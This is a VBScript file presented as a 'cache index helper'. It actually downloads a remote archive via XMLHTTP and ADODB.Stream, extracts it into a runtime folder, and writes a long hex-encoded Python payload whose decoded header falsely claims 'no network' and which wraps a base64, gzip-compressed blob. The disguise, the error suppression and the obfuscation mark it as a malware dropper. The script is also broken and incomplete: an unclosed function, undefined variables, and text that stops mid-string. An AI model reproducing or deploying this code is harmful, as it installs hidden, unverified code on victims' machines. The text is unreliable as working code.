' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex always refreshed, then repo fallback
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
Dim e
e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d206227365a343855334b52734d2f71446345326b2f614b6a6b6a69793734314d5632425978313138636c4f305871754b335a505268514c6852474974785a6d546545722f3337486f7957482f3844446544512f43524449796d586f4438336367533233496356705358674259734b4f5057755064625a2b67744a7951336641353243556d772b4a4c496b39467661424e4c5a41503973546b672b6143752f2f384d6532706f4c5a2f59544f6634347a3831686b69473950666143782f436f4579594d" & _
        "7756576a614548316d57736f6f416e354d4d595458364b6a5553616a637434506a4c7646444a393064506457312f4d305968543674385a374d73366333336756726b41527261447845507a503469754e576e50543263633157356c68707072346c33626f71724a57356c62424c482b524f594d354e4665336b51315265332f7663482b364a423379434537594354516563353154504e4f6d507968445570333043485a5469786478385755447165474b394272744b3247776b385a776277676445794c4974484b476d3349455a492f414b43627a3361524b547378473955694e536f634e4b725949326c657477646c70327a712f4561434646384c4c546e3334792b76744578536f2f726770744b304c4d64684c335942334d4353586870386d346864514c4a68455064634d5954474a367461753867376547426b307478486f4a306165787161725a4b396e37757068686f64345375684d6f6d4e6252625170795558486d47737631315a50384952716444394e54427059555877324d515769324274364b74724152564c69636e62577273736253654634732f37306277385670467346494b733269764a3634557557356736537779714b5a2b2f2b6875416e2b6f" & _
        "6d69635a4a2b7a6c2b42444241706b437865654c3730666d5849436f2f304b5371462f77396a776d484a5077536e554530735744307136416c3765495a4a573557417358586679314646436e76735731384a552b6a58764d4a4e516d5a6d616c6a324a4d353543664b467952664d6d4f4149373576775269702f612b5830692f304a774e645063736c7631454f685044535a2f316e3456354a4a6f556a396e726a7a7672736e6c5257777a6766566b46796447312f314e375672434b654d37306e4933703355785162765a75374178343941355a44495534492f796561424b75726e3135536f4772797a6c6b775273516553724f6f37367471506351566871386e7445384d447345414a5776362b58753679416a30345154704f4c4536675a7a3962696a487644632f774e55666b3469444848746332724a516e65493944764a742b2f727a4d46726c7a575157703741414f6530325052376655303750624c507a796f33673876714e304d485a67386e4b6a6d314f346f6c306a705352417942675a4533414b37417675335a6639642b4a4430577135672f324642345a664f4873754579486159694b69303577576e716674696d643077444849542f78454e2b6855" & _
        "4d41674275764a713268675251356d384e42733443464a306863454472323952567a7a6f4c2f4d333376435178346c564b6654696f5245736376657158487358476c6873574577735761736c504238544a5577426a41414d44714447572f506c556e747779706a55477264347a734a566455614374446476674d6470665651616c77347541414f375779526a6e54467a632f39646c5476475566585a6e656973756f4c447761493341573548472f6d4d6b4c576f42644a744132766d455a4f383355486b62593565767770524d384d333134594874446f7172754743734c53564732356b6e596a732f6e376a35736a426e2f78324d376144495a446f684265776d75735838356449714b69357a6d44633577582f47654431676c4f623662414b6b41786335375a6a79584a6a443138436f72596a6c4a547461754c355678344b30736f66686c615a576c454b317a63327034774b564a4749324f437a65676e307974785562563034417865574c634f4e466b56325037796d6a4278576c3638764e4269506742336368503469636a41474b653676336b314b63424446374b764b724e6c336836336c4e424f3270304c513256467a386d47484f76374532324745776c" & _
        "452f55684f354d6c5a52726c63684d624354507457486d347a734655536536696348696345344e4554413773334f2b6e554c3154716c6977466d323050663750686b6b384a6b794c6d7547724e3461456642494f49456d365a525854524445414b7a346366486966785245386d647675516d636d396753506e2b6e7076325750592b455262552f4842514775344f5572642f394276325a396c4b2b464c48576f2b6851665a744162487937736b6e6839626165576e2f634537424a696e5a707857426177552b64565876724776534d646b375941774b46454673446655384268326e644347797750465232537937716c3972756563327146784966426d46676d6b564e525a6e333138424b38486974315462585672545157413055355945775454324174466a6c5350564935334b397838716a53314e41386b576737463861512b7647387342704a7650734c637a35756f393742414c4a2b7371717330784250705a2f302b713076356f636639313853506d77587a6937576d666c7048733770525575766e472b67307154736b4d58656643505539556c46317530323051725a6e77734c615050764e42475672626c4d3356354631614e347a756f4f707461744b77" & _
        "4f57714868575161566a7434564e5068473938377055613831452f726a77456e506f523854306871636352495841634f6977513276676d3941573537717871653976554567393375596358724548396170387071442b554353354c714a53664d735152437845712b386c5a524e7a6e65672b383658726b4935454638774b717a573037574a74716e4269612b7066685a51426b65467049557a656d4e593331666d30432b36737852766448685942444368674734423334324449456b7336385a6776654f4f756a6e557656362f6a526d505237435053634d742b514264436f4f5a7434714471696e4e627741395a5a5536316d6939334d4b516f2b7764396a367566315161376b716a627446766e49735437555233727a34365a5a5a5a6269636369564539504f683075625a50306b7a3241543774526b524a51594e59534b556b4d365266376a435341504e56775154347169627a6e445241383166386a4f746572693875696536444c65526c4e4758517079626c6358585753575444774446694c6e744d596b7752547149482f546c506f366d624b634b66644e37526f694d53526a436f7737472b553238767a714544337378416c7a4e514967753045474a2f72" & _
        "724164586f6341594272394a2f51676c326957486c7134786b6a357073456a4f6e4b5a6939376e2f4379783868744246304432556851345a726a76394254573331665059424d736c6e36666368702b52795669786b496264506e52393332485a49683278623559545a4f57744643484f755a447049376950576259556f787175786d56666b6b4b412b7a576e6f6851577231563038346a417776544d6d564334304973416d5a5258316f2f474c7243763433414f7264732f3849372f4453722f4c44456953357348535876596f674a494473753574627a3271375242646431587a69422b366a4d6a44634a4a71437a4a354678526278596c4537587562342f4a37556f454e4d2b657a55796f766c444a646f4a4c3270596a43706f39526d7a414f5277726f4e4d43343445757133784e7855324f47526261347675316e556a502b617a4d744155765570366953764f38306975784e356c4d694c3065647953496c75442b4a2f4c4b62506639546b6e31614e5345715335782b727a50575a666e6631526367414f312b3461433858737a4454643434704f41794f6331465834645236616b6961747078536664776874324e45624272344a6276796855715a3852614a" & _
        "416f495655442b4a50766c586c347a626b5178367653567176683248325962776e6e7049393077786f5762784a5270786a75454f53723263795939504a74663848546e4a796c534f4b45504e5935376f635373523678714c574a78674639645a61654b42753042675452515a654a753276376b357563767564476763724f543264637878637a343777644779536c4b4959556666647639576a5670772f4a5962366a6e5644734d587672746273704b4d4953444a6a762b4f55594f79364b2f74474d62484c54583047386e563645395859566b53514148354c5a5a6f61435742644a6a474d6e484a706830636a5a52676e5a533671555535306d734a76307242656f6864653446436933317a6d5a58626e4c694e31463949757079777134317a4d394c6e56386b2b44504176556262643452635449616f72727a543735705068392f545048342b3279395545733456646d2b446a57745276377067703169574b57686c7173355769427a642b5a5872436a58684f4644616268724b526b4966434e6f314e664a4c334a32384941707a363549496b34326232486242386235306874757969676e4c764c6f62736e55726d3557517356546e4c3144786d6e76777a3358" & _
        "74616d614c685034347232734a4c5a7a5a5075394b77714e7a3258716176486e4833487155372f5156336b55795a613355584c75374143394e4f63314366613974516f41435163574f7a616f5859645a695973726555787879587356774c42426269776b53524e6a55656a586c6878313550554e583731636e5533374163524d484c364f526f6843464147384765727a713955514a6751625650774f3937686e322b47496b656c38706b544f61786b36527667367435574848304672314d4b49323173655a317345436e38612f722f383675626379445241535177332b504e3773734f4855334c723739463245795352387a34484d70744f672b5a5849396737654939685444546d6f4e707a62774c666767694143426d3874466351304f45566f356d422f4f505a5a3956584a3567564d4f333662664c6a464a49694a416d72635749536372623553627353365967713043317951694a374251397064664a2f557435782b6a726157514b70326c6f73574959776d45694b6e74756d69385a4246756c377a347442546a6e726646742f5a61336f55444f48493859544c444e75594e44794d5a4f67686c797571574847556152506f4b5a697a34747664514e745a41" & _
        "3637427a507075696853786c756c76565173364c42574934324179723152487345684a70666f48445042457164434b574256347a663066574330454a33487a734f39777633325766766d5154384b4a704371374d59443664426f59674e4331776b7530616d6d46514f2b4661554634386a4b6c4377557034652f5452772b63434341496b585271304a566b79735931796f6a4f6a4638465347463341746d3573757a66522b5a4c52347171726f4f2b7458324534674a617962504d485938637352323950306a4b52696d5a6a762f31703667306a314f6c5a7362694676744662696f4464564658475236787a567450653544554e325231786a5767703157584b4142346541336b6362704e41477a5831794356544e5a6f4a4b58715961442f51436f4235584946726877737a316f6d49516c386d56643037347a2f43683038635578457a4a3169556b37757a79703249596a4e6c793459427861337a7033482f735130346e345669584a386b78344b57335077386f78716c4d637862573856554877477335696c50575163582f6d73474a573249377a4a55793134466e2f7a78496e7930446f6d734d446341685561775945657437792f6545692b776b537a6c5232" & _
        "584b3741386241645431364b5032325a7a4256416b3365345a72445349316f524a7a4b2b4b4643495655305a4e7949534238372f6530616e646d56724e314f364b5737546f5650535a42482f4d63616b4f74667453616234634b72585248393069353647484361764e4a2f537965544a63423538422b2b4d6d5a527358354e6a525a67564a4e4a2b4b313951444d61727546475a6177574e64436a2b2b6f4d77383845594d57573851764855736f4d37767036544a6a485a616f6e706b59794a484a6c74787376687630637743315969455342336f56474b415148794e472f68396468427570547150483962775a597230692f394c5351785238593061526676754a6a326a73426f453664506478526c597237664a31427435744a68703970553738476c454f66463065523838517a775767432b6f3430746b53477868716551722b344f506e674c785446426e335134764c3435415764726c42433849376f47416274394c3161306e6a76514a4e6f356942424e57696b785a796c50674f73455a77424c79707167754b732f532f4b736a5a6a594c54754a4172666d35564c686953654649753059523566786665714c73705a495a77637a304c7867514831546e49" & _
        "6c78476a6b6c37525a706c754134354f3537756b4b4576744472764a3533784f71535538676137667737693745677066677a475a4c68775833777733492f614e53512b73512f4176633970713471624339464972327431354a384651734d4f4471466c4658564a4f642b61696253534f67745056617a7a42456637664e633555586e4646666d70473176476b56732b704931496d7766464d64433668536d6877365a6e676d794e6b48546e7a387a415450692b34504a6562436d56644d386b344b56595974734a79664472323163776f547076444f75775a52792f4371724a47686e2f72574d674d57744a50347a7a76694f384651736773735a574f356864476f4c6a566833502b3479336c6d314d495045436e3349764b5a5a47543844723855414f3944393862386f4f4e682b4256726454734561576971612f663778464953306866614457715345754c5a776d47497053644c394e6d4e3471765a4e684956512f38466846357239336c6139722f4d582f7354583033425a38444e686234333633333071755a592b486464594b4b47393330424a436750537359637a4d7a6667544d33523837537052497442434b4b424e644554684f48754165753856397473" & _
        "6c4632554d76667154324f43344c66786338344a30552f526c714a50716b6f45664976564a65696644335146312b78503458774f6932525651683778304b524a334d324455594c7454306748333376746c695257474561616d7a6a506354636f536b697562535752414449434d4b644442774d6f794e697641577339396b692f5a72696474796e57396c444f595a5a6e4d55454b7270786f554c69584d57753171456135733355317035424952717a5a79333764654b314943727a5842546556716545497539497056697049526662747442756c53327a7271737750422f5559386f552b38706c6f777a3473365759417877456343442f394965574547537a316150497030777439695a6e556a3258733350636b6379734354534d6c7377756d2f58416f4a384d62386357512f536a6b4257365576424d594d2f344b625278634e4b34653377744d6b574f783257583842327a7a46712b62484f72652b6c767a5162414a68536e4a5548632f2b742f5973756666656f6a4b65316d7968355961654d6a3158727457695a7577466442575731394779443937735166324937477a4c504756525832317838744c4c705a51333154486e3678714b495166726f7731504b" & _
        "57564e7867594c455333707a303174716b76584e464c5370775948334a6d636d677936475144562b7030333141474d2f5a5a306156454f6955696555305665674436626b4d6258415934423754724377717963706c3638554d6a4a2b2f446c45584731644350396c474d522f6e627a65362b6d534633534448444246586235784b596f5257376b4342454e4a68684175614a716b703234356d66364a796f73774157393942746a52556f38376a53514d413434467a3850387857785375526658726a4251614c706d3459664c53325778796669305074346335445a346a2b32586e66704c4a2f3335342f444c53346f307774394f5343535a676274594e61676e36307563436862784530425650356e5367662b782f716e707774524a3379644850554b695574547538413036537937332f5033754d39496c575862666153467a4e457974566d4e6d466176427a4c54465446366b7a362b35526256366d774b52415a7a6242717057615651353350733132737a57444a2f5a68522b4e456a456c6d47742f59596d6837552f436939493949326842442b756f386c4c467267514d4f3364677048415032394554666a64342b71524752322f73552f6958624d614c7451" & _
        "32476e32543477454a625a7852386c49627943764a7653522b765a75476555743066684a523073597a445862332b536b744d6b67686359374c486961386c72592f436a4e6967426c743138566b38574b7a6d5455442b747471546354633339395538394945746b50665033396b7a354677344d384b7a5143685150424c517a6a41686362434a6654744d6e566d2f5a2f2f6f2b3434625548636f62644b4734337137744c6e6869447a4f5764663537583933346263744b79364936444b746b7563364e6336315662504268666f4538497246634937396b556a746c5a56646a475175674a4f45707568706c62434f4e586f62466569456a2f347637746a443150304a7651466b50526862694277646a61566b4f4d584b51315a576a6d346b32674f5152707a32503778476634423374716b4e6f4b4349477757385451674a53695152695067654b58696f71786c574a6e786a566564506b7430493763616f57737978584338762f2f65652b614975615137636730565070354974536256433236576d36786e3031755275715a71574f4554446b2b556646785a677a3733336f3150585453356a7534714f343557723547574937785374472b76614539416b38544658" & _
        "4e4b67785467516d65464578793761534e416e2f6c4b61766c645063624a54372f73664745486e776c58723469523564763756557038495434786466593449646939684d55466b4f762b3365714d444a336d346a412b305a74343357625a562b7653382f2b487650324856706d335635586e646a736b7a58656d375a7975676351316e4b2f7454684761786661314237697846395971316557504932695066486968566a555333467364337932746d6f336f5444537a45413451696a74356c6e6f4e734a314348317166346e7564586c6d6c466c4854724b5363302b6b5230746e42694a536a4545454461594749467a2f792b4376394a45362b554f4d374677726c6f614f58536f496f4e66596c585972712b2b69722b4766665a65344f6c3970394d706f43724c664b67446830774d3642684e62723037686a39477a6d452f4c4c694a69436f394c586d7778334f466a61354b34344d74336d3975646b496a447a4b33582f6378694e66494d674862334658674b6b756c4c6a695632366a4e796738527467743452346e6231633064734b5247423871695a7658742f4e6738536132334b4f3144397a31565a52716752335a75623463685568644a653949507969" & _
        "434d302f51546335685a333358636c4a4c70796a4349682f764f767376305859427276496e434d615245434c7254696a2b36507333652b485653686a4762356d424c5a706f522b67337052537a51416b5737362b504b6874316c62524a45722b43682b74436a502b7a7831365771614d74393533636c5a7a3875734c63464d5265412f6b567331477638744b45486b505562742f7066586f4165584e686537694f52486c532b49306e314a594e586e4c5a3933502f55352f424371324c73516c594b74676d78772f7547754a7651624c6771395978337a7753374a426246515070656d31384a57416a50767454726c784870624f734a364a6a596b4f677a7730614d4f61555144703648526e64354b3035494f5531374b3438306b4e706c7a4b4d2f7733353257625555595a54754d3452752f4673344c744d4f6254506657596f534366477464687772437252564b386f596c6b44547777463166675a2f497536666c4a74476355526f4156646279713275544b35784e68516a30676d66687459726443686836347567524e5a6d71704b457859484e7975323259505961446f42514e4168362b6b5772554b426a3746465455363631695a6764484668764142494d" & _
        "557269564f6a30504d535a63542b364e456954755150587a7976454536697146574c3164367054707a6752506f30645a6e3470503249446563546854324971544b7335306b496436373157624e70414178424e453638727a647142544a6a4f50324e55797741394c356851376c6755492f4744306852644464694c587577763568664345334c6669487057464e6d514a7a596d306a755a74616156336a474e4a56527436734a7762374149724b5432324e6d46315a776c4657445770345047476c394a30505330464a66454b4a6d475937613130564839357664535a4733787a4b614a6e676d584a41656c694b706b3631516d477958437556747965474c52794c666d5130347161712b6b6f49415832436e6c4275797267554c50556461686b6b666263526f4c51354f38334b4145336b65366e675375555043726d734841554445756a634d4b3747774c53575453516c74304168642f5a6d706f774176633774496e626c4b4d444c79736436522b4339307775557176703150316a456854716d414575716133623372794b2b552b4265646f4a316e7453454c7a34736646355a737534455767583745345353366f7049574d2b433979583032716c5149376c707a" & _
        "755551624f69626c5834344d536b2f584a7942343377734a576f373448644a506a6955676a506f7739644873492b343679654d767055667478354c30647a68312b724f4831703747696d495a6d427a476e746e6861534262636a7a7954495275435a306b6b5a586d554a4f614549426d78354c336d72702f796c5262716842472f63664b78347367586c47366f4e664e64317534372f7264664d5967574d785961766a325943524c4f69366151316d79494357306637515a47633579454976623362706a71506f62586f6877655255566c4d7363395a51326f7242316f746b4d4834497a6c37465147594932315661474e464c666c566b4154414878384c2b736a38687a41794f4e4b5a6e4156644c353278474c72774976516a45576564766c364b424b646151713959774f695778426c3466394e7454717a482b714c7658454c6265394d4552692b752b57736f78794e64517450636f572b6a45586344674d2b653848654e6c7876734e707a4166327a656d584d493966692f6f645544373371596c6b43707278506d693247625a63355a6378434a46685952517a37757350666c50562f644961543059665237526d716258445058636378746742695347646674" & _
        "6a6e6f6a524e4d434430446359414d616a4b6131707061732b46514f564c69365930516a6d5a4e555876566f374769624442595a686356544877544b63653479316d46387a55337578525253577164672f4b4a7962645177493956717850716b68343855384f335446577056625270553072706b62786547737347653563736a7034357731696c55734550454277636243585939766877726f38703951376e386e6862615171722f6c4b6e2b54594b6e535a525a3871646f48696674746a6d486f66742f756a5341755a6b304a5869563868425a55312f67726b4f3234314b6f5a4574634256764c4c6a68625268376c2b46726d48393051324a346e4f392b4f5165634876434371484b78486d654e795854375370676756354e435631426f5677723055564d50654341447949453477435a4979696d48514a2f65796f546d664e4162484c37647453354348534f6376534a574f374b317144713261496d533931786b562f2b4c36364d326c68313543425253766e564e2b6a722b716c7330722f2b71727a714f393245594b5a556257384d793241335a76334472327030426d706a7653552f746d75365766557a6b326236644b302f334f6e494175494270674669" & _
        "43756b566d764274724c6653336e69624e446566554c4f6f773079673438396158444957582f526a6833702b59534b48553930364d6130686551494b594d42476c6652444c58564d544c6c594c32362f634350597078444a6e473772465253542f64576d6273642b6a6b7a62372f56566973763545443647654b556145382f4e78424658574f6b687571446b62504c61644b6b484e2f33763342736b46424a6374323337783261765751664164574c376b365a3858766f37514d6749704976742b655977477a644a414274424f5352675a794d7142574c31576a4b65496b56756d49516b5331644d6163695167356d6e5565573566754b51354553506a553036556234365058556f5261545670696b462b62506e3363746134457a51522f386e7934714659767167754b4c7658324945765348562f724d4b7637566372524d4f34736851682b6e485657546732546f6d4e3146746f56622f7a56536e502b325a505172385578436c644338523659476c2b494b564b316549343931487352565a6a6c64773775695764486c372b417049544561444b486e41794a577764514978417152684c3431747742516f77734139383148455034332f647a69536c6372666834" & _
        "366d76665a71597456736e5568352f75732f6d664237714432336b307561545949456832386f3169502b41645944736948657a755543576e38484b754a447178364539744267437166463957527458684e776d6c3737492f4235355847503166725549624c78516d35694e314b30446563355a416d35584e7141447a343243544852685a465166696443716b68653957663148567958687356796d586a2f546d716d467650347a4971477765697735723968496b54662b396e366c486551416478426b453166627668736b7338727649583142474153336c54554337637750337363623869354572704a466957617965665163724e394d464665754f4f52672b4f52396450656342365142564554446b646c44644478653243527378436e6131614d2b7867486b2b42435a3850524556504c71527263507a4a30624a7339782b5059763056334c37336762394c33382b424c4358744946616a466d796d63334b5979333379414155554d3244627662415957777276736e5478574465456736494f4f38367257534e3979345253745a552f4f3767536b694a6c396c665539773735766d704f57646b6e466964577878784e743331654d5034357065645263345a3570" & _
        "684f71307a454e74766357466b4b41397348584b7a63334a76612f313637424b6c7a51334653464c36316e565357676e393868306a7a476654554956727339523739455647695747314e467969494c3034686e5776766b5167736853494248764947386153535762614a78452b555a4c4a67436f4b703236744f6f76544a546b61594545655457614b32456a4e31427557527467327a4254495334766e4379354e774758544547465931737446414a4264426e534e6c7a446c73326e77426a385955504967674373466e4e467452494c783677474374474b4e6c626b5861565279535079674950664d344152693850694547327455322b5677362b55556a38332f70424b5a57593574696c61624772564c4e367a67704a74704470396244687054627131784e6d5456654b7536617663503166397a6d6975304b49665a5a4d4b536e7277705937714f576e4d68345650773135416255774a69546b484c786b45674273576157496934656d7057396a315671694871583855596d65584d5676486a6d4c4e4e434a4d72333772514b6f37587973416e387a6367542b6d6b71792b4e3545326e5a4b556870436b484744446247664e506273386f4f797947516736584e" & _
